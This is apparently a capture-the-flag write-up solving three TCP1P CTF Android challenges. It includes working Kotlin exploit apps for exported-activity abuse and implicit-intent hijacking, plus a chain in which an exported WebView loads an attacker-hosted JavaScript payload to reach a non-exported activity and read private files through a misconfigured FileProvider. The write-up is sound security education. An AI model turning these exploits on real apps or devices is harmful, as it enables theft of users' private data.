---
title: "TCP1P CTF 2023 — Mobile Writeups"
date: 2023-10-16
category: "mobile"
tags: ["ctf", "android", "intent", "webview", "content-provider"]
description: "Mobile challenge solutions from TCP1P CTF: exported activity exploitation, implicit intent hijacking, and a WebView/JS interface/content provider chain."
draft: false
---
# TCP1P Capture the Flag: Mobile Writeups
![](/images/writeups/rkb0FZq-6.png)


## Background Info
![](/images/writeups/B1Ag8-cWT.png)

I participated in the TCP1P ctf this past week and was intrigued by their set of mobile challenges which I mainly focused on and got first blood🩸on the challs I solved. On this writeup, I'll discuss the solutions for both solved and (may be a bit delayed) unsolved mobile challenges.

## Mobile Infrastructure
Been a while since I last played ctfs, but this seems like the first time I've seen mobile challenges deployed like this because normally Mobile challengest mostly revolved on reverse engineering the app or native lib. Hopefully, other ctfs will follow suit and implement more mobile exploitation challenges since they are very fun to do. For reference, the TCP1P team has released the infra + source code on their [github repo](https://github.com/TCP1P/ctf-mobile-exploitation-setup).

![](/images/writeups/r1kGUZcb6.png)
<p style="text-align: center;">Fig. 1 Main Dashboard</p>

![](/images/writeups/S1yfLZ5Z6.png)
<p style="text-align: center;">Fig. 2 Device Shell</p>

![](/images/writeups/SJ1z8WqZT.png)
<p style="text-align: center;">Fig. 3 Web Emulator</p>

While promising, there were still some stuff that can be improved regarding the mobile infra. For the purposes of this writeup, I'll replicate the challenges using my physical device (Xiaomi Redmi 9c).

During the ctf, we were given access to the vulnerable apk and an instance to run the exploit on. In solving the challenges, we were tasked to create an android application exploit to attack a vulnerable component within the target app. To mirror real-world scenarios, we should note that the device is operating in a non-rooted environment.

## Intention - 356
![](/images/writeups/rk5NL-qbp.png)

### Static Analysis
We load up `intention.apk` into `jadx-gui` and start our analysis by going over the `AndroidManifest.xml` file which basically serves as an overview to the structure and behavior of the app. 

![](/images/writeups/SJMpxG9-p.png)

As we can see with the screenshot above, there's an interesting activity called `com.kuro.intention.FlagSender` that comes with the exported attribute set to true -- this means that any application installed within the device will be able to call/start this activity.

### com.kuro.intention.FlagSender
The code for the FlagSender activity is actually straightforward. First, it opens the flag file from its internal files directory via `openFileInput` and then sends its contents via a string intent to the calling activity through the [setResult](https://developer.android.com/reference/android/app/Activity#setResult(int,%20android.content.Intent)) call. 

In Android, the setResult method is used to **send a result back from a secondary activity to its parent activity when the secondary activity has finished its operation**. This result typically includes data or information relevant to the parent activity, and it allows for communication and data exchange between the two activities in the context of a user interaction, such as when one activity is started with the **startActivityForResult** method.

So the attack path here is clear, we need to create an exploit application that starts the FlagSender activity (given that it is exported) then retrieves the flag from the string extra returned by the setResult call.

![](/images/writeups/r1bnbGqb6.png)

### Exploit
#### MainActivity.kt - Attacker Application
```kotlin=
override fun onCreate(savedInstanceState: Bundle?) {
        super.onCreate(savedInstanceState)

        Log.d("exploit", "we are here")
        val pwnIntent = Intent()
        pwnIntent.setClassName("com.kuro.intention", "com.kuro.intention.FlagSender")

        val pwnResult: ActivityResultLauncher<Intent> = registerForActivityResult(
            ActivityResultContracts.StartActivityForResult()) {
            result ->
            Log.d("exploit", "here?")
            if (result.resultCode == -1) {
                Log.d("exploit", "did we atleast reach here?")

                setContent {
                    Tcp1pCTFintentionexploitTheme {
                        // A surface container using the 'background' color from the theme
                        Surface(
                            modifier = Modifier.fillMaxSize(),
                            color = MaterialTheme.colorScheme.background
                        ) {
                            result.data?.extras?.getString("flag")?.let { Greeting(it) }
                        }
                    }
                }
                result.data?.extras?.getString("flag")?.let { Log.d("exploit", it) }
            } else if (result.resultCode == 0) {
                Log.d("exploit", "something went wrong")
            }

        }

        Log.d("exploit", "sending pwn intent")
        pwnResult.launch(pwnIntent)
```

The idea for the exploit is quite simple, we just start the activity, receive the intent, parse the flag data then place it into a textview using the default setContent template from compose. Since the FlagSender activity does not call finish(), we need to manually press the back button in order to return back to our calling (attacker) activity.

{{< youtube 38OG49n1udc >}}

## Imagery - 436
![](/images/writeups/BkcN8-cZ6.png)

### Static Analysis

Upon reviewing the AndroidManifest file for the application, we only have one (1) activity in-scope which is the application's MainActivity. 

Taking a look at it, we can see that after it checks if some permissions regarding managing/reading external storage has been set, it proceeds to call the openImage() method which performs a `startActivityForResult` call using an implicit intent via the intent action `android.intent.action.PICK`:

![](/images/writeups/SJATh2qWT.png)

Now might be a good time to discuss that android intents are categorized as either **explicit** or **implicit**:

**1. Explicit Intents**
An explicit intent is one that you use to launch a specific app component, such as a particular activity or service in your app. Notice that the Intent()s being created specify which activity to open/use. For example:

```kotlin=
val demoIntent = Intent()
demoIntent.setClassName("com.kuro.intention", "com.kuro.intention.FlagSender")
startActivity(demoIntent)
```


**2. Implicit Intents**
An implicit intent specifies an action that can invoke any app on the device able to perform the action. Using an implicit intent is useful when your app cannot perform the action, but other apps probably can and you’d like the user to pick which app to use. For example:

```kotlin=
val demoIntent = Intent("android.intent.action.VIEW")
startActivity(demoIntent)
```

Using an implicit intent can be dangerous, since these can be intercepted by malicious applications within the device. The risk is heightened when the intent itself contains sensitive information or if a vulnerable unsafely handles the data received from other applications. 

In the case of `imagery.apk`, the latter is evident given that on the `onActivityResult` handler we see that it performs an `openInputStream` call from its content provider using data that is received from the result of whichever application handled the `startActivityForResult` call.

![](/images/writeups/B1_Ug65bT.png)

What this means is that a malicious application installed within the device could intercept the implicit intent using `android.intent.action.PICK` then control the intent data parameter it returns in order to open any arbitrary files from within the imagery application's internal (/data/data/com.kuro.imagery) directory.


### Exploit Steps

When creating the exploit code for the vulnerability, we need to take note of the following information:

1. We need to add an intent-filter to our activity so that it intercepts the implicit intent. If we review the openImage method, we can recall that it used the action `android.intent.action.PICK` and specified a mime type of `image/*`. We can also set the priority to `999` which isn't really important for this challenge, but on real-world engagements this could allow our attacker application to appear first on the list if a chooser dialog opens for implicit intents. 

```xml=
<activity
            android:name=".MainActivity"
            android:exported="true"
            android:label="@string/app_name"
            android:theme="@style/Theme.Tcp1pimageryexploit2">
            <intent-filter>
                <action android:name="android.intent.action.MAIN" />
                <category android:name="android.intent.category.LAUNCHER" />
            </intent-filter>
            <intent-filter android:priority="999">
                <action android:name="android.intent.action.PICK"/>
                <category android:name="android.intent.category.DEFAULT"/>
                <data android:mimeType="image/*"/>
            </intent-filter>
        </activity>
```

2. We then craft our intent payload, specify the path of the flag stored in the imagery application's private directory, and then finally call setResult with the specific resultcode (since we only reach the file read primitive if the result code is == 133337) and supply our intent payload. We finish() it up so that it properly returns to the calling activity.
3. View the exploit in action:

{{< youtube Na7yTnmV2e8 >}}

## Netsight - 496

![](/images/writeups/HJ9V8-9-T.png)


This challenge chained multiple vulnerabilities which is why its pretty cool that I drew first blood on it. 

### Static Analysis
![](/images/writeups/B1AQ8T9bp.png)

When reviewing the manifest file above, we take note of the following components:
- PickerActivity, not exported
- com.tcpip.netsight.MyContentProvider, not exported but has the `grantUriPermissions` attribute set to true. File paths are defined via @xml/provider_paths.
- WebviewActivity, exported
- MainActivity, exported

The most interesting thing that stands out is the exported WebviewActivity which we'll analyze next:

### Webview Vulnerabilities
As we know by now, an activity being set to exported means that it can be accessed by other applications within the app. This doesn't necessarily mean that being exported is a vulnerability, given that most applications export specific functionalities so that other applications can interact/share with their data. But in the case of webviews, yea you shouldn't let anyone open up arbitrary webviews as we can see in the pattern below:

![](/images/writeups/S1AJdTqWa.png)

Within the WebviewActivity's onCreate method, we can see that the webview opens up a url supplied by an external intent via the string extra "url". This in itself can already be classified as a vulnerability since unauthorized applications should not be able to start up arbitrary web pages. We can verify that we do have the capability to do so by performing the adb command:
```shell=
$ adb shell am start -n com.tcpip.netsight/.WebviewActivity --es "url" "https://blackbeard666.github.io"
```

But what makes this more interesting is that the webview client has some additional methods defined -- javascript interfaces:

![](/images/writeups/HyZ5qa9-T.png)

JavaScript interfaces in Android WebViews enable communication between JavaScript code running in a WebView and the Android application. They allow JavaScript to call Android methods and vice versa, facilitating interaction between web content and native Android functionality.

This means that if we can somehow open up an arbitrary url in the webview which contains javascript, we can easily interact with the code defined in the application's exposed interfaces. In this case, the js interfaces do the following:
- **showToast**: basically takes in a string then creates a toast message from the given values
- **accessDeeplink**: takes in a url parameter, parses it as an intent object via the Intent.parseUri call and then performs startActivity with the intent. 

Having the capability to supply an intent object and start the activity pointed to by the intent is a recipe for **access to non-exported components**. Oversecured has a pretty cool article to demonstrate the [attack flow](https://blog.oversecured.com/Android-Access-to-app-protected-components/). 

Looking back from the defined components in the android manifest, we might want to begin analyzing the non-exported **PickerActivity** now that we have a way to start arbitrary components. 

### PickerActivity.kt
![](/images/writeups/rJn7JRcZp.png)

Similar to the previous challenges, this one uses the same pattern of using an implicit intent, setting the intent data blindly from the received intent via getIntent().getData() before passing it as an extra to the new intent which is sent on the startActivityForResult call.

Additionally, we should review lines 18-19 from the code. Setting the 0x1 flag on the intent corresponds to granting the `FLAG_GRANT_READ_URI_PERMISSION` on the data received from getData. This means that if we supply a file path from the netsight application's file provider, we can have read access to the files that we want. 

For this, we want to review the `@xml/provider_paths.xml` file which defines which directories or files could be shared by the content provider:

```xml=
<?xml version="1.0" encoding="utf-8"?>
<paths>
    <root-path name="root" path=""/>
    <files-path name="internal_files" path="."/>
    <cache-path name="cache" path=""/>
    <external-path name="external_files" path="my_files"/>
</paths>
```

The internal_files path is misconfigured since it allows arbitrary access to files under `.` which is the internal directory for the netsight application.

Now that we have most of the ingredients for our exploit chain, let's get cooking. 

### Exploit, Stage 1
For the first stage of the exploit, we want the netsight application to open up an attacker-controlled webpage and then execute the `accessDeeplink` javascript interface which includes our intent deeplink payload to start the non-exported PickerActivity.

You might ask: "*Wait, no deeplinks were defined via the intent-filter stuff, what deeplink do we provide then*?". In Android, we can specify deep links using the **intent:// scheme**. This scheme allows us to **create Intent objects and supply intent data** in a flexible and dynamic manner. I used the following code to generate what deeplink I would need to supply in order to call the PickerActivity and control the flag data extra:

```kotlin=
var pickerIntent = Intent()
pickerIntent.setClassName("com.tcpip.netsight", "com.tcpip.netsight.PickerActivity")
pickerIntent.data = Uri.parse("content://com.tcpip.netsight.FileProvider/internal_files/files/flaggo.txt")
Log.d("exploit", pickerIntent.toUri(Intent.URI_INTENT_SCHEME))

var test = Uri.parse(pickerIntent.toUri(Intent.URI_INTENT_SCHEME)).toString()
var testIntent = Intent.parseUri(test, Intent.URI_INTENT_SCHEME)
Log.d("exploit", "testIntent.data = " + testIntent.data.toString())
```

Result from logcat:
```
2023-10-16 22:52:10.282 14508-14508 exploit                 tcp1p.netsight.pwned.by.avila        D  intent://com.tcpip.netsight.FileProvider/internal_files/files/flaggo.txt#Intent;scheme=content;component=com.tcpip.netsight/.PickerActivity;end
2023-10-16 22:52:10.283 14508-14508 exploit                 tcp1p.netsight.pwned.by.avila        D  testIntent.data = content://com.tcpip.netsight.FileProvider/internal_files/files/flaggo.txt
```

From this point, I spun up a quick web instance via glitch which contained the following `script.js` file:
```javascript=
// https://roasted-citrine-howler.glitch.me/script.js
netsight.showToast('testpwn was here');
netsight.accessDeeplink('intent://com.tcpip.netsight.FileProvider/flaggo.txt#Intent;scheme=content;component=com.tcpip.netsight/.PickerActivity;end');
```

After which, we send the payload to start the exported webview activity and open up the url we supply:
```kotlin=
// start intent to load picker activity from webview
        var webviewIntent = Intent()
        webviewIntent.setClassName("com.tcpip.netsight", "com.tcpip.netsight.WebviewActivity")
        webviewIntent.putExtra("url", "https://roasted-citrine-howler.glitch.me")
        Log.d("exploit", "sending initial payload to webview")
        startActivity(webviewIntent)
```

### Exploit, Stage 2
If everything goes smoothly, the netsight webview will basically call the following:
```kotlin=
var pickerIntent = Intent()
pickerIntent.setClassName("com.tcpip.netsight", "com.tcpip.netsight.PickerActivity")
pickerIntent.data = Uri.parse("content://com.tcpip.netsight.FileProvider/internal_files/files/flaggo.txt")
startActivity(pickerIntent)
```

The picker activity will then perform a start activity using the implicit intent action `android.intent.action.PICK`, so we need to setup another activity for our exploit app in order to intercept the call and the intent data that we need from it:
```kotlin=
<activity
            android:name=".PickerExploit"
            android:exported="true"
            android:theme="@style/Theme.AppCompat">
            <intent-filter android:priority="999">
                <action android:name="android.intent.action.PICK"/>
                <category android:name="android.intent.category.DEFAULT"/>
                <data android:scheme="content"/>
                <data android:host="com.tcpip.netsight.FileProvider"
                    tools:ignore="AppLinkUrlError" />
            </intent-filter>
        </activity>
```

Since the PickerActivity from netsight will be sending an intent with the structure of `content://com.tcpip.netsight.FileProvider`, I found out it was better to define an intent-filter this way in order to automatically intercept the intent. 

Once the PickerActivity starts the activity, we should be ready to receive the intent then retrieve the contents of the file pointed to by the intent.data since we should already have read access to it:
```kotlin=
class PickerExploit : AppCompatActivity() {
    override fun onCreate(savedInstanceState: Bundle?) {
        super.onCreate(savedInstanceState)
        setContentView(R.layout.activity_picker_exploit)

        Log.d("exploit", "we reach picker exploit ehehe")
        Toast.makeText(applicationContext, "we reach picker exploit on remote", Toast.LENGTH_LONG).show()
        val data : Intent? = intent
        if (data!!.flags == 1) {
            Log.d("exploit", "we got the correct values")
            val inputStream = data.data?.let { contentResolver.openInputStream(it) }
            //Log.d("exploit", inputStream!!.reader().readText())

            val textview = findViewById<TextView>(R.id.textView)
            textview.text = inputStream?.reader()?.readText()
        }

    }
}
```

The beauty in action:
{{< youtube d1pVUQYxChA >}}
## Unsolved Challenges
I didn't solve these during the ctf but I did learn a lot from the research process and reviewing the intended solution afterwards. Currently, I haven't prepared a writeup yet but I should be able to finish it within the week. Follow me on my socials to receive updates :) 

## OTA - 491
![](/images/writeups/H1cVIZ5Wa.png)

## Internals - 499
![](/images/writeups/BJ1dIW5b6.png)
